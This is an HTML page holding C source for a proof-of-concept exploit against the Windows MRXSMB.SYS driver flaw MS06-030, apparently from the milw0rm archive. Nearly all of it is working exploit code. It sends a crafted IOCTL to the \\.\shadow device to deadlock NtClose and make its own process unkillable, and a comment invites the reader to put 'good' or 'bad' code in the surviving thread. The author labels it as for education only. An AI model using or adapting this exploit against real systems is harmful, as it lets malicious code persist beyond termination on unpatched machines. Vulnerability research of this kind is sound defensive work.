<html><head><title>MS Windows (NtClose DeadLock) Vulnerability PoC (MS06-030)</title></head><pre>////////////////////////////////////////////////////////////////////////////////
///////// MRXSMB.SYS NtClose DEADLOCK exploit///////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
//November 19,2005
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
//ONLY FOR EDUCATION PURPOSES
////////////////////////////////////////////////////////////////////////////////
// Rubén Santamarta 
// ruben (at) reversemode (dot) com
// http://www.reversemode.com
////////////////////////////////////////////////////////////////////////////////

#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;


#define MAGIC_IOCTL 0x141047


VOID ShowError()
{
 LPVOID lpMsgBuf;
 FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER| FORMAT_MESSAGE_FROM_SYSTEM,
               NULL,
               GetLastError(),
               MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
               (LPTSTR) &amp;lpMsgBuf,
               0,
               NULL);
 MessageBoxA(0,(LPTSTR)lpMsgBuf,&quot;Error&quot;,0);
 exit(1);
}


VOID IamAlive()
{
 DWORD i;
 
 for(i=0;i&lt;0x1000;i++)
 {
  Sleep(1000);
  printf(&quot;\rI am a Thread and I am alive [%x]&quot;,i);
 } 

}


VOID KillMySelf()
{
     
 DWORD junk;
 DWORD *OutBuff;
 DWORD *InBuff;
 BOOL bResult;
 HANDLE hDevice;
 DWORD i;
 
  hDevice = CreateFile(&quot;\\\\.\\shadow&quot;, FILE_EXECUTE,FILE_SHARE_READ|FILE_SHARE_WRITE,
                      NULL, OPEN_EXISTING, 0, NULL);
                      
  if (hDevice == INVALID_HANDLE_VALUE) ShowError();
  
  OutBuff=(DWORD*)malloc(0x18);
  if(!OutBuff) ShowError();
  
  OutBuff[3]=(DWORD)hDevice;
  
  DeviceIoControl(hDevice,
                  MAGIC_IOCTL,
                  0,0,
                  OutBuff,0x18,
                  &amp;junk,
                  (LPOVERLAPPED)NULL);
  // MAIN THREAD ENDING.
}


int main(int argc, char *argv[])
{
    
 LPTHREAD_START_ROUTINE GoodThread;
 DWORD dwThreadId;
 DWORD bResult;
 GoodThread=(LPTHREAD_START_ROUTINE)IamAlive;
 

  printf(&quot;-=[MRXSMB.SYS NtClose Vulnerability POC]=-\n&quot;);
  printf(&quot;\t(Only for educational purposes)\n&quot;);
  printf(&quot;..http://www.reversemode.com..\n\n&quot;);
  printf(&quot;Launching Thread ...&quot;);
  
  // PUT YOUR &quot;GOOD&quot; OR &quot;BAD&quot; CODE HERE
  // e.g GoodThread
  CreateThread(NULL,0,GoodThread,0,0,&amp;dwThreadId);  
  
   
  printf(&quot;Done\n&quot;);
  printf(&quot;I am going to dissapear,but I will be with you forever\n&quot;);
  printf(&quot;(..)\n\n&quot;);
  KillMySelf(); // Immortal mode &quot;on&quot; ;)
  
  return(1); 
}

// milw0rm.com [2006-06-14]</pre></html>